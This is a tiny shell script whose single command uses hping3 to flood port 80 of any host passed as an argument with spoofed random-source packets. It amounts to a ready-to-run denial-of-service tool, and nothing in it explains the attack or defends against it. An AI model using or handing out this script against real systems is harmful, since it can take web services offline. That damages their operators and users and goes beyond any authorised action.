#!/bin/sh
hping3  -V --flood --rand-source -p 80 $@
